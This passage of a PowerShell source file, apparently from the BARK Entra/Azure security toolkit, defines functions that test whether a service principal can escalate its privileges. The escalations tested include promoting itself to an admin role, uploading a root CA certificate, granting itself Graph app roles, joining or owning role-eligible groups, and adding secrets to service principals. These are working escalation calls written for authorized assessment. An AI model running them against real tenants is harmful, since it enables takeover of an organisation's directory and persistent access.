            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can activate itself into the provided role and return the test result object
    $body = @{
        "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
        principalId = $TestPrincipalID
        roleDefinitionId = $RoleDefinitionId
        directoryScopeId = "/"
    }
    $Success = $False
    Try {
        $ActivateEntraRoleTest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
            -Method POST `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Promote self to GA"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }
    $AbuseTestResult.PSObject.TypeNames.Insert(0, 'BARK.AbuseTestResult.SelfEntraAdminRoleAssignment')

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"

        # Clean up the test by removing the SP from the Entra role
        # Wait 1 minute for the Entra admin role activation to have propagated in Azure before deleting it
        Start-Sleep -s 60
        $body = @{
            "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
            principalId = $TestPrincipalID
            roleDefinitionId = $RoleDefinitionId
            directoryScopeId = "/"
        }
        Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
            -Method DELETE `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSelfToEntraRoleDefinition' -Value (Get-Command -Name "Test-MGAddSelfToEntraRole") -Force
New-Variable -Name 'Test-MGAddSelfToEntraRoleAst' -Value (${Test-MGAddSelfToEntraRoleDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddRootCACert {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add a new Root CA cert to the tenant

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Tests whether a Service Principal can add a new Root CA cert to the tenant

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER HeldPrivilege
        The MS Graph app role your SP has been granted

    .EXAMPLE
        C:\PS> Test-MGAddRootCACert `
            -TestToken $TestToken `
            -GlobalAdminMGToken $GlobalAdminMGToken `
            -TimeOfTest $($Get-Date) `
            -HeldPrivilege "RoleManagement.ReadWrite.Directory"

        Description
        -----------
        Tests whether a Service Principal can add a new Root CA cert to the tenant

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can upload a Root CA cert to the tenant
    $CACert = "MIIFxzCCA6+gAwIBAgIUXASMMaj2xfEt36/EfCQ93QicgekwDQYJKoZIhvcNAQELBQAwcjELMAkGA1UEBhMCVVMxEzARBgNVBAgMCldhc2hpbmd0b24xEDAOBgNVBAcMB1JlZG1vbmQxEjAQBgNVBAoMCU1pY3Jvc29mdDEMMAoGA1UECwwDUEtJMRowGAYDVQQDDBFwa2kubWljcm9zb2Z0LmNvbTAgFw0yMjExMDEwMjUzMTRaGA8yMDUwMDMxOTAyNTMxNFowcjELMAkGA1UEBhMCVVMxEzARBgNVBAgMCldhc2hpbmd0b24xEDAOBgNVBAcMB1JlZG1vbmQxEjAQBgNVBAoMCU1pY3Jvc29mdDEMMAoGA1UECwwDUEtJMRowGAYDVQQDDBFwa2kubWljcm9zb2Z0LmNvbTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAM4NWTWlIAP/pT25CQmF81Z+X+ovgLpqreQIN0rWwUeIwgulMu0y4sl04cPW5UxAIWm5TO/3Lw/lkNtAJ1EGb0n938SCXUZytS0IPkIq7xRmlAb1sxo6GsXth+RNhYvBseSmR3vBQYRqJ0jIzxk1gWX1wk61tgPdmo//sBUuV1IloccUfsfw2H4MBHJkzTb4/wEtNuW7wvSnfmiDlmLg2B89P9gY2YAjyKQ4++xizw3r+TAcIYRB/FRmBLkohvxRUVxM7uQI0JwZO7qoRxgbjUHu7i8pDe4mKo5XdiDa1V1Et9Owll4Hhj+T3oS7N4CsA+6reoVNAhWpf41PZloDRiukOxIZBM5TGggDI2VnYVRXZCStjIL8/41fJRewDZ2mLmGTlfr+xBx5lZrtp7BDU/MyQiJ+67vn3a0wgT5nKrKKOx4cFOEC1iemjE5hkgSHh5V4XyONoC981PsPs4sXbiHyyQq45umdcC7dl7j0IpftGQQ8K203pE2jlpEGEH3YMsNjIfkQw+jJ3bveBcY99vTtkWOJuWPA/cSfcYI6/svC01Rv7OTqjLUqzEE7hlUeEwPSiuvBW+3XmVswVcrOOV0wpL4uS4dhOJKb0YHzkGFNgjVpaKWf4e18uvup3+ifagnsqvkBzYjDhw3vFw3WdEsNUcCIFcSVOTENolpwedwVAgMBAAGjUzBRMB0GA1UdDgQWBBSpOno8StEFK957IDsbGvWpzFzepjAfBgNVHSMEGDAWgBSpOno8StEFK957IDsbGvWpzFzepjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4ICAQBEz8Thc/3eo6MxWN87MTFU4o77weDA2UL8isl8g5j4+6xfyWkl622ho+6FV0rIhKzmjMgZ172o/i0lMXTg8EK6sUjwWH0PhnsONU210ck1MFfO4ljC+hTT2NNO6nh6qjhQYbdLVssON6MiTumHN8rhbpf3LSdtEaaaEY3/u2km1RvjoIo0Bu4ZYjx1sGA1ttqs2GoqPtmEh45lUIT3kH56byydKLNuPa1xMNHtJAAk1PPwNk/o1cObgsBOYS4QuWD3QDM791EPlpUyOu/anE0nPYGaqYiHfNU76klwrOSzwoYT9hJRyEO1KPDGzWHEeRJeMN5Fpq3J/C0M8UNF5rZeib8EC9CmuSUtLO7dI4bffUGlPMqGtX97nFJ9D5hih1+NOCu/fi/tFzAZ89Dp2dPLAKxuGVyHoQkov3MpM+iVY2oXKACgs2fHu7d7sruD3j8MQRgnPzdnRgot0PQiO/Yp+uh+YdWW+et+dPXb1VCRtTd9LUCGKAN76N4I1YIosbJrFC3YlPniBuYRcj2tHf+EeU2Zus/pCqadhGm4w8fe6gAbrr9zpznKTjkxEagStQwjYk9RfQhHxuFj7COuJPqf0CFlPO7TQ+MGSPvybfkrvetKCsApYqsTp3ERgHCvadVSojGTeJRAXKmTyHAf3dImsetLPak/BsjKoyRpIR1TmA=="
    $body = @{
        certificateAuthorities = @(
            @{
                isRootAuthority = "true"
                certificate = $CACert
            }
        )
    }
    $Success = $False
    Try {
        Invoke-RestMethod `
            -Uri "https://graph.microsoft.com/v1.0/organization/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/certificateBasedAuthConfiguration" `
            -Method POST `
            -Body $($Body | ConvertTo-Json -Depth 2) `
            -Headers @{
                Authorization = "Bearer $($TestToken)"
            } `
            -ContentType "application/json"
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add a Root CA Cert"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }
    $AbuseTestResult.PSObject.TypeNames.Insert(0, 'BARK.AbuseTestResult.AddRootCACertToTenant')

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }

    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddRootCACertDefinition' -Value (Get-Command -Name "Test-MGAddRootCACert") -Force
New-Variable -Name 'Test-MGAddRootCACertAst' -Value (${Test-MGAddRootCACertDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSelfToMGAppRole {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can activate itself into an MS Graph App role

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to activate itself into a an MS Graph App role

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER MGAppRoleDefinitionId
        The globally unique ID of the MS Graph app role you are trying to activate

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddSelfToMGAppRole `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -MGAppRoleDefinitionId "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
            -TestToken $TestToken `
            -GlobalAdminMGToken $GlobalAdminMGToken `
            -TimeOfTest $(Get-Date)

        Description
        -----------
        Test whether the supplied JWT can grant itself RoleManagement.ReadWrite.Directory

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $MGAppRoleDefinitionId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
    )

    # If either the test token or GA token expire in the next 5 minutes, bail and report this to the user.

    # Ensure the provided Entra role is activated.

    # Check whether the test SP is already activated for the role. If so, remove the SP from that role and get a new test token for that SP

    # Test whether the SP can activate the RoleManagement.ReadWrite.All MS Graph app role:
    $body = @{
        principalId = $TestPrincipalId
        resourceId  = "9858020a-4c00-4399-9ae4-e7897a8333fa"
        appRoleId   = $MGAppRoleDefinitionId
        startTime   = "2020-01-01T12:00:00Z" # This field is required or the API call will fail. The value does not matter.
        expiryTime  = "2023-01-01T10:00:00Z" # This field is required or the API call will fail. The value does not matter.
    }
    $Success = $False
    Try {
    $GrantAppRole = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
        -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($TestPrincipalID)/appRoleAssignedTo" `
        -Method POST `
        -Body $($body | ConvertTo-Json) `
        -ContentType 'application/json'
    $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Grant self MG App Role"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }
    $AbuseTestResult.PSObject.TypeNames.Insert(0, 'BARK.AbuseTestResult.SelfMGAppRoleAssignment')

    If ($Success -Or $HeldPrivilege -Match "RoleManagement.ReadWrite.Directory") {
        $AbuseTestResult.AbuseTestOutcome = "Success"

        # Clean up the test by removing the SP from the Entra role
        # Wait 1 minute for the Entra admin role activation to have propagated in Azure before deleting it
        #Start-Sleep -s 60
        #$body = @{
        #    "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
        #    principalId = $TestPrincipalID
        #    roleDefinitionId = $RoleDefinitionId
        #    directoryScopeId = "/"
        #}
        #Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
        #    -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
        #    -Method DELETE `
        #    -Body $($body | ConvertTo-Json) `
        #    -ContentType 'application/json'
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSelfToMGAppRoleDefinition' -Value (Get-Command -Name "Test-MGAddSelfToMGAppRole") -Force
New-Variable -Name 'Test-MGAddSelfToMGAppRoleAst' -Value (${Test-MGAddSelfToMGAppRoleDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddOwnerToRoleEligibleGroup {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add itself as owner of a role eligible security group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Tests whether a Service Principal can add itself as owner of a role eligible security group

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to add as an owner of the target security group

    .PARAMETER TargetGroupId
        The globally unique ID of the target role eligible security group

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddOwnerToRoleEligibleGroup `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the test principal can add itself as an owner over the group with object ID of "b9801b7a-fcec-44e2-a21b-86cb7ec718e4"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetGroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add itself as owner of a role eligible security group
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalID)"
    }
    $Success = $False
    Try {
        $ActivateEntraRoleTest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri            "https://graph.microsoft.com/v1.0/groups/$($TargetGroupId)/owners/`$ref" `
            -Method         POST `
            -Body           $($body | ConvertTo-Json) `
            -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add owner to Role Eligible group"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddOwnerToRoleEligibleGroupDefinition' -Value (Get-Command -Name "Test-MGAddOwnerToRoleEligibleGroup") -Force
New-Variable -Name 'Test-MGAddOwnerToRoleEligibleGroupAst' -Value (${Test-MGAddOwnerToRoleEligibleGroupDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddOwnerToNonRoleEligibleGroup {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add itself as owner of a non-role eligible security group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Tests whether a Service Principal can add itself as owner of a non-role eligible security group

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to add as an owner of the target security group

    .PARAMETER TargetGroupId
        The globally unique ID of the target non-role eligible security group

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddOwnerToNonRoleEligibleGroup `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the test principal can add itself as an owner over the group with object ID of "b9801b7a-fcec-44e2-a21b-86cb7ec718e4"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetGroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add itself as owner of a non-role eligible security group
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalID)"
    }
    $Success = $False
    Try {
        $ActivateEntraRoleTest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri            "https://graph.microsoft.com/v1.0/groups/$($TargetGroupId)/owners/`$ref" `
            -Method         POST `
            -Body           $($body | ConvertTo-Json) `
            -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add owner to Non-Role Eligible group"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddOwnerToNonRoleEligibleGroupDefinition' -Value (Get-Command -Name "Test-MGAddOwnerToNonRoleEligibleGroup") -Force
New-Variable -Name 'Test-MGAddOwnerToNonRoleEligibleGroupAst' -Value (${Test-MGAddOwnerToNonRoleEligibleGroupDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddMemberToRoleEligibleGroup {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add itself as member of a role eligible security group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to add itself to a role eligible security group

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER TargetGroupId
        The globally unique ID of the target role eligible security group

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddOwnerToRoleEligibleGroup `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the supplied JWT can add itself as a member to the group with object ID of "b9801b7a-fcec-44e2-a21b-86cb7ec718e4"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetGroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add itself to a role eligible security group
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalID)"
    }
    $Success = $False
    Try {
        $ActivateEntraRoleTest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
        -Uri            "https://graph.microsoft.com/v1.0/groups/$($TargetGroupId)/members/`$ref" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add member to Role Eligible group"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddMemberToRoleEligibleGroupDefinition' -Value (Get-Command -Name "Test-MGAddMemberToRoleEligibleGroup") -Force
New-Variable -Name 'Test-MGAddMemberToRoleEligibleGroupAst' -Value (${Test-MGAddMemberToRoleEligibleGroupDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddMemberToNonRoleEligibleGroup {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add itself as member of a non-role eligible security group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to add itself to a non-role eligible security group

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to add as a member to the group

    .PARAMETER TargetGroupId
        The globally unique ID of the target non-role eligible security group

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddOwnerToNonRoleEligibleGroup `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the supplied JWT can add itself as a member to the group with object ID of "b9801b7a-fcec-44e2-a21b-86cb7ec718e4"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetGroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add itself to a non-role eligible security group
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalID)"
    }
    $Success = $False
    Try {
        $ActivateEntraRoleTest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
        -Uri            "https://graph.microsoft.com/v1.0/groups/$($TargetGroupId)/members/`$ref" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add member to Non-Role Eligible group"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddMemberToNonRoleEligibleGroupDefinition' -Value (Get-Command -Name "Test-MGAddMemberToNonRoleEligibleGroup") -Force
New-Variable -Name 'Test-MGAddMemberToNonRoleEligibleGroupAst' -Value (${Test-MGAddMemberToNonRoleEligibleGroupDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSecretToSP {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add a new secret to a service principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to add a new secret to a service principal

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER TargetSPId
        The globally unique ID of the target service principal

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddSecretToSP `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetSPId "12b4c92b-d200-422a-adcc-fd2b910bbbaa" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the supplied JWT can add a new secret to a service principal with object ID of "12b4c92b-d200-422a-adcc-fd2b910bbbaa"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
